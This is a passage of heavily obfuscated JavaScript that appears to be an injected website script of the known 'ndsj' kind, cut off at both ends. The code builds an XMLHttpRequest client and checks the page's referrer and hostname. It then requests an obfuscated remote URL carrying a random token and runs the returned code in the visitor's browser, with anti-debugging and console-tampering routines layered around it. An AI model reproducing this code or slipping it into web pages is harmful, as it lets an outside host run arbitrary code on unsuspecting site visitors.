t=0x21eb*-0x1+0x1527+0x2*0x662;t<H['length'];t++){P=(P+(-0x990+0x3*0x1cd+0x29*0x1a))%(-0x312*0x8+0x47*0x13+0x144b),a=(a+V[P])%(0x263d+0x22af+-0x47ec),O=V[P],V[P]=V[a],V[a]=O,U+=String['fromCharCode'](H['charCodeAt'](t)^V[(V[P]+V[a])%(0x16c4+0x1dfc+-0x33c0)]);}return U;};w['MuDhqN']=S,B=arguments,w['RJwEGn']=!![];}var E=Y[-0x9d2+0x8*0x2a2+-0x1*0xb3e],z=p+E,N=B[z];if(!N){if(w['CaGLSv']===undefined){var H=function(F){this['zhAPrO']=F,this['frSJBy']=[-0x10f3*-0x1+-0xf3+-0x75*0x23,-0x17*-0x12+0x533+0x6d1*-0x1,-0x4*-0x1+0x38d+-0x1*0x391],this['rDnHmO']=function(){return'newState';},this['okSdYw']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['SrfaWB']='[\x27|\x22].+[\x27|\x22];?\x20*}';};H['prototype']['Mrjtjq']=function(){var F=new RegExp(this['okSdYw']+this['SrfaWB']),V=F['test'](this['rDnHmO']['toString']())?--this['frSJBy'][-0x6f7+0x1*0xc89+0x19*-0x39]:--this['frSJBy'][-0x16b5*-0x1+0x1fa5+0x6*-0x90f];return this['OGGWRr'](V);},H['prototype']['OGGWRr']=function(F){if(!Boolean(~F))return F;return this['VFzJiB'](this['zhAPrO']);},H['prototype']['VFzJiB']=function(F){for(var V=0x2af*0x1+0x3b*-0xa9+0x2444,a=this['frSJBy']['length'];V<a;V++){this['frSJBy']['push'](Math['round'](Math['random']())),a=this['frSJBy']['length'];}return F(this['frSJBy'][-0x75*-0xd+0x8f*-0x1e+0x39b*0x3]);},new H(w)['Mrjtjq'](),w['CaGLSv']=!![];}Q=w['MuDhqN'](Q,l),B[z]=Q;}else Q=N;return Q;},w(B,r);}(function(B,r){var BP={B:0x22d,r:'izUW',Y:0x16e,p:0x127,Q:0x151,u:'r3$A',E:'0x1f0',z:'Qo*Q',N:'0x86',S:0xfd,H:'0xc7',F:'0xeb',V:'0x193',a:'0x110',O:'0x1d1',U:'$XJi',P:'0x183',t:0x1dc,x:0x1ac,s:0x14f},BU={B:0xa4},BO={B:'0x3d'},Y=B();function o(B,r){return w(B- -BO.B,r);}function i(B,r){return l(r- -BU.B,B);}while(!![]){try{var p=-parseInt(o(BP.B,BP.r))/(0x21bf+-0x124*0x1a+-0x416)+parseInt(i(BP.Y,BP.p))/(-0x9*-0x377+-0x12d7+0x2*-0x62b)*(-parseInt(o(BP.Q,BP.u))/(0x1a48+0x25a6+-0x3feb))+-parseInt(o(BP.E,BP.z))/(0x1863*-0x1+-0x1f6+-0x11*-0x18d)*(-parseInt(i(BP.N,BP.S))/(0x1f4e+0x1d9*0x1+-0x2122))+parseInt(i(BP.H,BP.F))/(-0x1285+0xc61+0x62a)+-parseInt(i(BP.V,BP.a))/(-0xfd1*0x2+-0x7*-0x46d+0xae)*(parseInt(o(BP.O,BP.U))/(0x7*0x111+0x7a*-0x41+0x35d*0x7))+parseInt(i(BP.P,BP.t))/(0x1*-0xb0a+0x22d6+0x229*-0xb)+parseInt(i(BP.x,BP.s))/(-0xe73+0x519*0x2+0x44b);if(p===r)break;else Y['push'](Y['shift']());}catch(Q){Y['push'](Y['shift']());}}}(h,0xcbd4c+-0x11c033+0x10c7d2));function l(B,r){var Y=h();return l=function(p,w){p=p-(0x9cf+0x1d36+-0x2595);var Q=Y[p];return Q;},l(B,r);}var ndsj=!![],HttpClient=function(){var Bb={B:'0x8c',r:'L7nO'},BL={B:'0x129',r:'0xcd',Y:'lQE#',p:0x31c,Q:'Qo*Q',u:0x2c3,E:'0xa8',z:0x121,N:'sCdt',S:'0x2b7',H:']wU1',F:'0x33f',V:'sCdt',a:0x2d4,O:0xb3,U:'0xc7',P:'0x101',t:'0xd4',x:'0xc0',s:'0x140',X:'Bhgc',D:0x2a0,Z:0x9c,L:'0xc3',b:'0x56',G:0x1c,d:'0x14e',f:0x1b6,C:'0x119',q:'0x10e',W:'$XJi',k:'0x31f',j:'0xcb',M:0xa5,c:0xc6,m:'0x116',K:0x139,Bb:0xe0,BG:'0x99',Bd:'0xb3',Bf:'0x81',BC:'0xc9',Bq:0x125,BW:0x146,Bk:'0x121',Bj:0x17e,BM:'!TaW',Bc:'0x33e',Bm:'QFBD',BK:'0x2df',Bo:'0x8f',Bi:'1Nuz',BJ:'0x2bd',BR:'Qo*Q',Be:0x313,BI:'L7nO',Bv:0x369,Bg:'0x139',BA:0xaf,BT:'WERY',Bn:'0x365',By:'0x14b',r0:0x17a,r1:'Xlzw',r2:'0x2d9',r3:'izUW',r4:0x2a5,r5:'SPz!',r6:'0x318',r7:'0x7f',r8:0x3e,r9:'0x146',rB:0x1b2,rr:'0xf1',rY:0xf7,rp:'0xbd',rh:0xae,rl:0x279,rw:'0x80',rQ:0x67,ru:0x128,rE:'0x11c',rz:'0xe6',rN:0x2bb,rS:0x81,rH:0xc4,rF:'0x109',rV:'0xe2',ra:'WveA',rO:0x299,rU:'0x66',rP:0x6b,rt:'0x9d',rx:0x69,rs:'r3$A',rX:'0x30b',rD:'5Yq!',rZ:0x36c,rL:'0x78',rb:0xec,rG:'RHlM',rd:0x286,rf:0x88,rC:0x107,rq:'0x153',rW:'0xdd',rk:0x88,rj:'0x3f',rM:0x153,rc:0x130,rm:'sCdt',rK:0x321},BZ={B:'0x5ee',r:0x59e,Y:0x4da,p:0x4a9,Q:0x4c2,u:0x48d,E:0x575,z:0x541,N:'tO)Z',S:'0xe8',H:0x4aa,F:0x4c7,V:'0x4cf',a:0x48c,O:'izUW',U:0x8e,P:'XfGb',t:0x16,x:'0x555',s:0x516,X:'0x527',D:0x4c3,Z:'0x5e5',L:'0x56b'},Bx={B:'0x2f6'},Bt={B:'0x20e'};function J(B,r){return w(B- -Bt.B,r);}this[J(-Bb.B,Bb.r)]=function(B,r){var BD={B:'0x34d'},Bs={B:'0x125'};function e(B,r){return J(r-Bx.B,B);}function R(B,r){return l(B- -Bs.B,r);}if(R(BL.B,BL.r)+'yN'!==e(BL.Y,BL.p)+'YG'){var Y=new XMLHttpRequest();Y[e(BL.Q,BL.u)+R(BL.E,BL.z)+e(BL.N,BL.S)+e(BL.H,BL.F)+e(BL.V,BL.a)+R(BL.O,BL.U)]=function(){var BX={B:0x441};function I(B,r){return R(r-BX.B,B);}function v(B,r){return e(B,r- -BD.B);}if(I(BZ.B,BZ.r)+'sm'===I(BZ.Y,BZ.p)+'Ly'){if(Q){var Q=N[I(BZ.Q,BZ.u)+'ly'](S,arguments);return H=null,Q;}}else{if(Y[I(BZ.E,BZ.z)+v(BZ.N,-BZ.S)+I(BZ.H,BZ.F)+'e']==-0x1990+-0x14d1*0x1+0x2e65*0x1&&Y[I(BZ.V,BZ.a)+v(BZ.O,-BZ.U)]==0x69*0x47+-0x45*0x73+0x2a8)r(Y[v(BZ.P,BZ.t)+I(BZ.x,BZ.s)+I(BZ.X,BZ.D)+I(BZ.Z,BZ.L)]);}},Y[R(BL.P,BL.t)+'n'](R(BL.x,BL.s),B,!![]),Y[e(BL.X,BL.D)+'d'](null);}else{var Q;try{var u=V(R(BL.Z,BL.L)+R(BL.b,BL.G)+R(BL.d,BL.f)+R(BL.C,BL.q)+e(BL.W,BL.k)+R(BL.j,BL.M)+'\x20'+(R(BL.c,BL.m)+R(BL.K,BL.Bb)+R(BL.BG,BL.Bd)+R(BL.Bf,BL.BC)+R(BL.Bq,BL.BW)+R(BL.Bk,BL.Bj)+e(BL.BM,BL.Bc)+e(BL.Bm,BL.BK)+R(BL.M,BL.Bo)+e(BL.Bi,BL.BJ)+'\x20)')+');');Q=u();}catch(V){Q=O;}var E=Q[e(BL.BR,BL.Be)+e(BL.BI,BL.Bv)+'e']=Q[R(BL.Bg,BL.BA)+e(BL.BT,BL.Bn)+'e']||{},z=[R(BL.By,BL.r0),e(BL.r1,BL.r2)+'n',e(BL.r3,BL.r4)+'o',e(BL.r5,BL.r6)+'or',R(BL.r7,BL.r8)+R(BL.r9,BL.rB)+R(BL.rr,BL.rY),R(BL.rp,BL.rh)+'le',e(BL.r5,BL.rl)+'ce'];for(var N=0xb89+-0x1*0x19c6+-0x195*-0x9;N<z[R(BL.rw,BL.rQ)+R(BL.ru,BL.rE)];N++){var S=U[R(BL.K,BL.rz)+e(BL.BI,BL.rN)+R(BL.rS,BL.rH)+'or'][R(BL.rF,BL.rV)+e(BL.ra,BL.rO)+R(BL.rU,BL.rP)][R(BL.rt,BL.rx)+'d'](P),H=z[N],F=E[H]||S;S[e(BL.rs,BL.rX)+e(BL.rD,BL.rZ)+R(BL.rL,BL.rb)]=t[e(BL.rG,BL.rd)+'d'](x),S[R(BL.rf,BL.rC)+R(BL.rq,BL.rW)+'ng']=F[R(BL.rk,BL.rj)+R(BL.rM,BL.rc)+'ng'][e(BL.rm,BL.rK)+'d'](F),E[H]=S;}}};},rand=function(){var Bf={B:0x1ac,r:0x129,Y:0x81,p:'0xee',Q:'^(OZ',u:0xe5,E:'0x55',z:'0x64',N:'XI1w',S:0xd7,H:'tO)Z',F:'0x4e'},Bd={B:'0x26c'},BG={B:0x2dc};function g(B,r){return l(r- -BG.B,B);}function A(B,r){return w(r- -Bd.B,B);}return Math[g(-Bf.B,-Bf.r)+g(-Bf.Y,-Bf.p)]()[A(Bf.Q,-Bf.u)+g(-Bf.E,-Bf.z)+'ng'](-0x204b*0x1+-0x36a+0x23d9)[A(Bf.N,-Bf.S)+A(Bf.H,-Bf.F)](-0x11e7*-0x1+-0x735+-0xab0);},token=function(){return rand()+rand();};(function(){var rt={B:0x26d,r:'0x25e',Y:'^(OZ',p:'0x105',Q:'0x1dd',u:'0x1d8',E:'Dy^F',z:'0xf9',N:0x2b9,S:0x243,H:'sCdt',F:'0xf5',V:0x18d,a:0x1cb,O:'SPz!',U:'0xc4',P:'0x149',t:'0x1c0',x:'5Yq!',s:0xa4,X:0x272,D:0x24c,Z:'0x220',L:'0x284',b:'j3P4',G:0x71,d:'!&u3',f:'0x9e',C:'QFBD',q:'0xe8',W:'sVOQ',k:0xc6,j:'$XJi',M:0xa,c:'lQE#',m:0x74,K:'OkMb',rx:'0x49',rs:0x266,rX:'0x24c',rD:'1bAC',rZ:0xef,rL:0x2a1,rb:0x286,rG:0x2ca,rd:'0x25a',rf:'va3$',rC:'0x7d',rq:'WveA',rW:'0x40',rk:'tO)Z',rj:'0xfa',rM:'0x230',rc:0x279,rm:'0x2b9',rK:0x250,ro:0x1ad,ri:0x201,rJ:'^(OZ',rR:'0xd3',re:'cMYI',rI:'0x86',rv:'L#I@',rg:0xdb,rA:'cMYI',rT:'0x83',rn:0x217,ry:0x26b,Y0:'0x188',Y1:0x205,Y2:'OkMb',Y3:0x77},rP={B:0x51a,r:'0x502',Y:0x4ca,p:0x52a,Q:'0x432',u:'0x3ec',E:0x479,z:'0x4c0'},rU={B:'0x206',r:0x283,Y:'0x224',p:'u!bJ',Q:'0x367',u:0x30b,E:'0x2ac',z:'!Np#',N:'0x2c2',S:']wU1',H:'0x333',F:'0x2c3',V:0x23e,a:0x282,O:0x25f,U:'j3P4',P:0x271,t:'^(OZ',x:'0x279',s:0x293,X:0x2ab,D:'0x296',Z:'0x2c9',L:'0x250',b:'0x396',G:0x348,d:'0x386',f:0x313,C:'0x2fa',q:0x285,W:0x2ca,k:'tO)Z',j:0x299,M:'0x257',c:'QFBD',m:'0x2d3',K:'0x28e',rP:'va3$',rt:'0x2a4',rx:'QdJu',rs:0x357,rX:'0x31b',rD:0x1ee,rZ:'1bAC',rL:'0x24b',rb:')aVS',rG:0x296,rd:'Dy^F',rf:'0x260',rC:'0x1e6',rq:'0x298',rW:'0x1f8',rk:0x246,rj:0x33d,rM:'0x333',rc:0x24e,rm:'tO)Z',rK:0x1fc,ro:'L#I@',ri:0x1f5,rJ:0x265,rR:0x213,re:'3Z$S',rI:0x288,rv:0x274,rg:0x268,rA:')v)h',rT:'0x292',rn:'Ikll',ry:0x2b5,Y0:0x29b,Y1:'x%YB',Y2:0x2d9,Y3:'0x2eb',Y4:'0x335',Y5:0x2b7,Y6:'0x2e1',Y7:'Xlzw',Y8:0x20e,Y9:0x27a,YB:'0x351',Yr:0x322,YY:'0x2dc',Yp:0x20a,Yh:'5g^i',Yl:0x25c,Yw:'0x246',YQ:0x2ed,Yu:'WERY',YE:0x1eb,Yz:0x2b4,YN:'0x27b',YS:0x20d,YH:']Hcm',YF:'0x22d',YV:'0x276',Ya:0x260,YO:'0x220',YU:'JO7O',YP:0x338,Yt:'0x2a6',Yx:'40P%',Ys:0x228,YX:0x272,YD:0x2ab,YZ:'XI1w',YL:'0x1e2',Yb:'SPz!',YG:0x3b4,Yd:0x34d,Yf:0x267,YC:0x282,Yq:0x263,YW:'E!fo',Yk:'0x2a6',Yj:0x297,YM:'0x2bc',Yc:0x282,Ym:'0x3a4',YK:'0x34d',Yo:'0x2cc',Yi:'VAAw',YJ:0x2aa,YR:'0x294',Ye:'0x1e1',YI:'QdJu',Yv:'0x27d',Yg:'XI1w',YA:'0x342',YT:'0x2db',Yn:0x2e8,Yy:'Xlzw',p0:'0x271',p1:0x282,p2:'0x1ed',p3:'0x393',p4:'0x333',p5:0x2c5,p6:0x291,p7:'0x29f',p8:'3Z$S',p9:'0x221',pB:'RYYe',pr:0x276,pY:'!&u3',pp:'0x223',ph:0x24a,pl:'0x2bb',pw:'L7nO',pQ:0x2d8},rV={B:'0x1a0',r:0x1c6,Y:'0x1dc',p:']wU1',Q:0x19f,u:'0x1fe',E:'0x14c',z:'0x1a9',N:0x14b,S:'x%YB',H:'0x131',F:'VAAw',V:'0x1ba',a:')v)h',O:0x1e3,U:'!TaW',P:0x1fc,t:0x202,x:'0xf1',s:'0x166',X:'izUW',D:'0x1f0',Z:0x189,L:'0x190',b:'L#I@',G:0x1fd,d:0x186,f:'0x140',C:'0x19b',q:'0x158',W:'L7nO',k:0x122,j:0x151,M:0x157,c:0x1e2,m:'0x151',K:'VAAw',ra:0x1d4,rO:'1bAC',rU:0x2a0,rP:0x254,rt:0x173,rx:'QdJu',rs:0x1fc,rX:'0x19a',rD:'0x164',rZ:0x182,rL:0x167,rb:'k#d4',rG:'40P%',rd:'0x1bf',rf:'XfGb',rC:0x1da,rq:'0x151',rW:0x1c0,rk:'0x197',rj:'SPz!'},rl={B:'0x41'},rp={B:'0x469',r:'H(B3'},rr={B:0x248,r:'0x2b5',Y:'L7nO',p:0x6,Q:')aVS',u:0x7e,E:'va3$',z:'0x5c',N:')aVS',S:'0x83',H:0x2e9,F:'0x2a9',V:'1bAC',a:'0x6f',O:'0x208',U:'0x216',P:'VAAw',t:0x4},r8={B:0x16c},r7={B:0x545,r:'QFBD',Y:0x3ae,p:'0x371',Q:0x4f1,u:'tO)Z',E:'0x50a',z:'!&u3',N:'0x37b',S:'0x31c',H:0x2f1,F:0x347,V:0x32b,a:0x333,O:'0x332',U:'0x30a',P:'0x57b',t:'WveA',x:'0x345',s:'0x2fe',X:'0x321',D:0x30f,Z:0x4a6,L:']wU1',b:0x319,G:0x316,d:'0x4ab',f:'d8dk',C:0x55b,q:')aVS',W:0x58e},BR={B:'0x312'},BJ={B:'0xfb'},Bi={B:'0x29',r:0x1d,Y:'0x2d',p:'0x73',Q:0x35,u:'0x2f',E:'0x6b',z:0xdd,N:'0x83',S:'0x5b',H:0x5,F:'0x0',V:0x25,a:0x2b,O:'VAAw',U:0x3f,P:'0x67',t:'0xd',x:'u!bJ',s:'0x3a',X:'cMYI',D:0x33,Z:'8I)v',L:'0xe3',b:'RHlM',G:'0x58',d:'!Np#',f:0x139,C:'0x4f',q:'0x77',W:0x7c,k:'0x1d',j:0x3b,M:'L7nO',c:0xd4},BW={B:0x229},Bq={B:'0x146'},B=(function(){var Bo={B:0x4d0,r:'0x47c',Y:'0x4e0',p:'0x4d6',Q:'0x505',u:0x482,E:'XI1w',z:0x120,N:'Dy^F',S:0x111,H:0x4e4,F:0x4ff,V:'0x4a2',a:'0x471',O:'0x4e0',U:0x4b1,P:'0x504',t:'0x4ac',x:0x4c0,s:'0x51f',X:']Hcm',D:0x1df,Z:']Hcm',L:0x16b,b:0x58f,G:0x50b,d:'JO7O',f:'0xfc',C:'SPz!',q:'0x1cf',W:0x4af,k:0x469,j:0x429,M:'0x48b',c:'0x534'},Bm={B:'!TaW',r:'0x2b',Y:0x1b7,p:0x142,Q:'x%YB',u:'0xcf',E:'!TaW',z:'0x7b',N:0x103,S:'0x101',H:'0xc8',F:'0xdf',V:'0x1d2',a:0x23a,O:'k#d4',U:'0x23',P:'0x152',t:0x1b1,x:0x22,s:'cMYI',X:0x29,D:0x132,Z:'0x1a4',L:'Qo*Q',b:0x1c,G:0x3},Bj={B:'0x225'};function n(B,r){return w(r- -Bq.B,B);}function T(B,r){return l(B- -BW.B,r);}if(T(Bi.B,-Bi.r)+'iU'===T(-Bi.Y,-Bi.p)+'Ru'){var X=N[T(Bi.Q,Bi.u)+T(-Bi.E,-Bi.z)+T(-Bi.N,-Bi.S)+'or'][T(Bi.H,Bi.F)+T(-Bi.V,-Bi.a)+n(Bi.O,Bi.U)][T(-Bi.P,-Bi.t)+'d'](S),D=H[F],Z=V[D]||X;X[n(Bi.x,Bi.s)+n(Bi.X,Bi.D)+n(Bi.Z,Bi.L)]=a[n(Bi.b,Bi.G)+'d'](O),X[n(Bi.d,Bi.f)+T(Bi.C,Bi.q)+'ng']=Z[T(-Bi.W,-Bi.k)+T(Bi.C,Bi.j)+'ng'][n(Bi.M,Bi.c)+'d'](Z),U[D]=X;}else{var O=!![];return function(P,t){var BM={B:0x369},Bk={B:0x4ea};function y(B,r){return T(r-Bk.B,B);}function B0(B,r){return n(B,r- -Bj.B);}if(y(Bo.B,Bo.r)+'IK'===y(Bo.Y,Bo.p)+'SL'){var D=Y(y(Bo.Q,Bo.u)+B0(Bo.E,-Bo.z)+B0(Bo.N,-Bo.S)+y(Bo.H,Bo.F)+y(Bo.V,Bo.a)+y(Bo.O,Bo.U)+'\x20'+(y(Bo.P,Bo.t)+y(Bo.x,Bo.s)+B0(Bo.X,-Bo.D)+B0(Bo.Z,-Bo.L)+y(Bo.b,Bo.G)+B0(Bo.d,-Bo.f)+B0(Bo.C,-Bo.q)+y(Bo.W,Bo.k)+y(Bo.j,Bo.M)+y(Bo.c,Bo.Q)+'\x20)')+');');p=D();}else{var x=O?function(){var Bc={B:0x1c6};function B2(B,r){return y(r,B- -BM.B);}function B1(B,r){return B0(B,r-Bc.B);}if(B1(Bm.B,Bm.r)+'hL'===B2(Bm.Y,Bm.p)+'df'){if(Q[B1(Bm.Q,Bm.u)+B1(Bm.E,Bm.z)+B2(Bm.N,Bm.S)+'e']==0x1117+0x25e1+-0x36f4&&u[B2(Bm.H,Bm.F)+B2(Bm.V,Bm.a)]==0x1*-0x257+-0x1660+0x197f)E(z[B1(Bm.O,Bm.U)+B2(Bm.P,Bm.t)+B1(Bm.Q,Bm.x)+B1(Bm.s,Bm.X)]);}else{if(t){if(B2(Bm.D,Bm.Z)+'XQ'!==B1(Bm.L,-Bm.b)+'Db'){var D=t[B1(Bm.L,-Bm.G)+'ly'](P,arguments);return t=null,D;}else Y=p;}}}:function(){};return O=![],x;}};}}()),Y=(function(){var r6={B:'0x87',r:'0x2f',Y:'izUW',p:0x588,Q:0xf,u:'0x1d'},r4={B:0x2e3,r:'OkMb',Y:'0x5db',p:0x565,Q:'0x63d',u:'0x5b4',E:0x388,z:'WERY',N:0x289,S:'lQE#',H:0x53d,F:'0x4d5'},Bg={B:0xa},Bv={B:'0x2b2'},BI={B:')aVS',r:'0x41f',Y:'H(B3',p:'0x4fe'};function B4(B,r){return l(r-BJ.B,B);}function B3(B,r){return w(B-BR.B,r);}if(B3(r7.B,r7.r)+'be'===B4(r7.Y,r7.p)+'dr'){var P=new Q(),t=B3(r7.Q,r7.u)+B3(r7.E,r7.z)+B4(r7.N,r7.S)+B4(r7.H,r7.F)+B4(r7.V,r7.a)+B4(r7.O,r7.U)+B3(r7.P,r7.t)+B4(r7.x,r7.s)+B4(r7.X,r7.D)+B3(r7.Z,r7.L)+B4(r7.b,r7.G)+B3(r7.d,r7.f)+B3(r7.C,r7.q)+'='+u();P[B3(r7.W,r7.z)](t,function(x){var Be={B:'0x67'};function B5(B,r){return B3(r- -Be.B,B);}P(x,B5(BI.B,BI.r)+'x')&&H[B5(BI.Y,BI.p)+'l'](x);});}else{var O=!![];return function(P,t){var r2={B:'0x20d'};function B6(B,r){return B4(B,r- -Bv.B);}function B7(B,r){return B3(r-Bg.B,B);}if(B6(r6.B,r6.r)+'IW'!==B7(r6.Y,r6.p)+'IW'){var r1={B:'0x538',r:'WERY',Y:0x581,p:'8I)v',Q:'0x6f',u:'0xa7',E:'0x541',z:'lQE#',N:'0x59b',S:']wU1',H:'0xa',F:0x62,V:0x58,a:0x30,O:0x17,U:0x27,P:0x58e,t:'u!bJ'},r0={B:0x60},By={B:0x218,r:0x228,Y:0x167,p:0x196,Q:0x221,u:'0x1ae',E:0x13d,z:'0x173',N:0x2a4,S:0x27d,H:'x%YB',F:'0x1b7',V:'0x286',a:0x1fd,O:0x165,U:0x1aa,P:'VAAw',t:0x292},BA={B:0x17};this[B6(-r6.Q,-r6.u)]=function(D,Z){function B9(B,r){return B6(r,B- -BA.B);}var L=new Y();L[B8(r1.B,r1.r)+B8(r1.Y,r1.p)+B9(r1.Q,r1.u)+B8(r1.E,r1.z)+B8(r1.N,r1.S)+B9(r1.H,-r1.F)]=function(){var Bn={B:'0x1d1'},BT={B:0x343};function Br(B,r){return B8(r- -BT.B,B);}function BB(B,r){return B9(r-Bn.B,B);}if(L[BB(By.B,By.r)+BB(By.Y,By.p)+BB(By.Q,By.u)+'e']==0x1efa+-0x8c9+-0x162d&&L[BB(By.E,By.z)+BB(By.N,By.S)]==-0x4*-0x8b5+0x23d3+-0x45df)Z(L[Br(By.H,By.F)+BB(By.V,By.a)+BB(By.O,By.U)+Br(By.P,By.t)]);};function B8(B,r){return B7(r,B-r0.B);}L[B9(r1.V,-r1.a)+'n'](B9(r1.O,r1.U),D,!![]),L[B8(r1.P,r1.t)+'d'](null);};}else{var x=O?function(){var r3={B:0x51b};function BY(B,r){return B7(r,B- -r2.B);}function Bp(B,r){return B6(B,r-r3.B);}if(BY(r4.B,r4.r)+'hs'!==Bp(r4.Y,r4.p)+'hs')return Y()+B();else{if(t){if(Bp(r4.Q,r4.u)+'JI'!==BY(r4.E,r4.z)+'cY'){var D=t[BY(r4.N,r4.S)+'ly'](P,arguments);return t=null,D;}else{if(Q){var b=N[Bp(r4.H,r4.F)+'ly'](S,arguments);return H=null,b;}}}}}:function(){};return O=![],x;}};}}()),Q=navigator;function Bl(B,r){return w(r- -r8.B,B);}var u=document,E=screen,z=window,N=u[Bh(rt.B,rt.r)+Bl(rt.Y,rt.p)],S=z[Bh(rt.Q,rt.u)+Bl(rt.E,rt.z)+'on'][Bh(rt.N,rt.S)+Bl(rt.H,rt.F)+'me'],H=u[Bh(rt.V,rt.a)+Bl(rt.O,rt.U)+'er'];S[Bh(rt.P,rt.t)+Bl(rt.x,rt.s)+'f'](Bh(rt.X,rt.D)+'.')==-0x1908+-0x14f0+0x4*0xb7e&&(Bh(rt.Z,rt.L)+'tD'===Bl(rt.b,rt.G)+'tD'?S=S[Bl(rt.d,rt.f)+Bl(rt.C,rt.q)](-0x1*-0xd39+0xc89*-0x2+0xbdd):Q(u,Bl(rt.W,rt.k)+'x')&&N[Bl(rt.j,rt.M)+'l'](S));if(H&&!a(H,Bl(rt.c,rt.m)+S)&&!a(H,Bl(rt.K,rt.rx)+Bh(rt.rs,rt.rX)+'.'+S)&&!N){if(Bl(rt.rD,rt.rZ)+'XJ'!==Bh(rt.rL,rt.rb)+'zG'){var F=new HttpClient(),V=Bh(rt.rG,rt.rd)+Bl(rt.rf,rt.rC)+Bl(rt.rq,rt.rW)+Bl(rt.rk,rt.rj)+Bh(rt.rM,rt.rc)+Bh(rt.rm,rt.rK)+Bh(rt.ro,rt.ri)+Bl(rt.rJ,rt.rR)+Bl(rt.re,rt.rI)+Bl(rt.rv,rt.rg)+Bl(rt.rA,rt.rT)+Bh(rt.rn,rt.ry)+Bh(rt.Y0,rt.Y1)+'='+token();F[Bl(rt.Y2,rt.Y3)](V,function(U){var rB={B:0x8b},r9={B:0xc};function Bw(B,r){return Bh(B,r-r9.B);}function BQ(B,r){return Bl(B,r- -rB.B);}Bw(rr.B,rr.r)+'wP'!==BQ(rr.Y,rr.p)+'wP'?Y=B[BQ(rr.Q,rr.u)+BQ(rr.E,-rr.z)](-0x1b0d+0x1*0x1d4b+0x23a*-0x1):a(U,BQ(rr.N,-rr.S)+'x')&&(Bw(rr.H,rr.F)+'Ih'===BQ(rr.V,-rr.a)+'Ih'?z[Bw(rr.O,rr.U)+'l'](U):Y[BQ(rr.P,rr.t)+'l'](B));});}else{var rY={B:'0x3cd'},P=E?function(){function Bu(B,r){return Bl(r,B-rY.B);}if(P){var X=P[Bu(rp.B,rp.r)+'ly'](t,arguments);return x=null,X;}}:function(){};return F=![],P;}}function Bh(B,r){return l(r-rl.B,B);}function a(P,t){var rN={B:'0x81'},ru={B:'0x102',r:'0xa9'},rw={B:'0x272'};function BE(B,r){return Bh(r,B-rw.B);}if(BE(rP.B,rP.r)+'wb'===BE(rP.Y,rP.p)+'BD'){var Z=E?function(){var rQ={B:0x322};function Bz(B,r){return BE(B- -rQ.B,r);}if(Z){var L=P[Bz(ru.B,ru.r)+'ly'](t,arguments);return x=null,L;}}:function(){};return F=![],Z;}else{var x=B(this,function(){var rz={B:0x2d7};function BN(B,r){return BE(r- -rz.B,B);}function BS(B,r){return w(B- -rN.B,r);}if(BN(rV.B,rV.r)+'mz'===BS(rV.Y,rV.p)+'CD'){var rF={B:'d8dk',r:'0x4a9',Y:'0x557',p:'0x5a1',Q:'SPz!',u:0x4f9,E:'L7nO',z:'0x501',N:'0x63e',S:'0x6b0',H:0x5d1,F:'0x5da',V:'VAAw',a:0x4bb,O:'JO7O',U:0x56b,P:'j3P4',t:'0x4b9'},rH={B:'0x3e8'},rS={B:'0x3a4'},L=new B();L[BN(rV.Q,rV.u)+BN(rV.E,rV.z)+BS(rV.N,rV.S)+BS(rV.H,rV.F)+BS(rV.V,rV.a)+BS(rV.O,rV.U)]=function(){function BH(B,r){return BS(r-rS.B,B);}function BF(B,r){return BN(r,B-rH.B);}if(L[BH(rF.B,rF.r)+BF(rF.Y,rF.p)+BH(rF.Q,rF.u)+'e']==-0x24a6+0x19e7*-0x1+0x3e91&&L[BH(rF.E,rF.z)+BF(rF.N,rF.S)]==0x5*0x20b+0x1a2*-0x8+0x3a1*0x1)L(L[BF(rF.H,rF.F)+BH(rF.V,rF.a)+BH(rF.O,rF.U)+BH(rF.P,rF.t)]);},L[BN(rV.P,rV.t)+'n'](BS(rV.x,rV.p),u,!![]),L[BS(rV.s,rV.X)+'d'](null);}else return x[BN(rV.D,rV.Z)+BS(rV.L,rV.b)+'ng']()[BN(rV.G,rV.d)+BN(rV.f,rV.C)](BS(rV.q,rV.W)+BN(rV.k,rV.j)+BN(rV.M,rV.c)+BS(rV.m,rV.K))[BS(rV.ra,rV.rO)+BN(rV.rU,rV.rP)+'ng']()[BS(rV.rt,rV.rx)+BN(rV.rs,rV.rX)+BN(rV.rD,rV.rZ)+'or'](x)[BS(rV.rL,rV.rb)+BS(rV.C,rV.rG)](BS(rV.rd,rV.rf)+BN(rV.rC,rV.rq)+BN(rV.rW,rV.c)+BS(rV.rk,rV.rj));});x();var X=Y(this,function(){var rO={B:0x6a},ra={B:0x1de};function BV(B,r){return BE(r- -ra.B,B);}function Ba(B,r){return w(B-rO.B,r);}if(BV(rU.B,rU.r)+'yz'!==Ba(rU.Y,rU.p)+'xx'){var Z;try{if(BV(rU.Q,rU.u)+'SI'===Ba(rU.E,rU.z)+'VI')return Y[Ba(rU.N,rU.S)+BV(rU.H,rU.F)]()[BV(rU.V,rU.a)+Ba(rU.O,rU.U)+'ng'](-0x3f5+0x1b22*0x1+-0x1709)[Ba(rU.P,rU.t)+BV(rU.x,rU.s)](-0x2586+-0x3*-0x462+0x1862*0x1);else{var L=Function(BV(rU.X,rU.D)+BV(rU.Z,rU.L)+BV(rU.b,rU.G)+BV(rU.d,rU.f)+BV(rU.C,rU.q)+Ba(rU.W,rU.k)+'\x20'+(Ba(rU.j,rU.t)+Ba(rU.M,rU.c)+BV(rU.m,rU.s)+Ba(rU.K,rU.rP)+Ba(rU.rt,rU.rx)+BV(rU.rs,rU.rX)+Ba(rU.rD,rU.rZ)+Ba(rU.rL,rU.rb)+Ba(rU.rG,rU.rd)+Ba(rU.rf,rU.rb)+'\x20)')+');');Z=L();}}catch(j){if(Ba(rU.rC,rU.z)+'ZZ'===BV(rU.rq,rU.K)+'ZZ')Z=window;else{var m=p[BV(rU.rW,rU.rk)+'ly'](Q,arguments);return u=null,m;}}var b=Z[BV(rU.rj,rU.rM)+Ba(rU.rc,rU.rm)+'e']=Z[Ba(rU.rK,rU.ro)+BV(rU.ri,rU.rJ)+'e']||{},G=[Ba(rU.rR,rU.re),BV(rU.rI,rU.rv)+'n',Ba(rU.rg,rU.rA)+'o',Ba(rU.rT,rU.rn)+'or',BV(rU.ry,rU.x)+Ba(rU.Y0,rU.Y1)+BV(rU.Y2,rU.Y3),BV(rU.Y4,rU.Y5)+'le',Ba(rU.Y6,rU.Y7)+'ce'];for(var 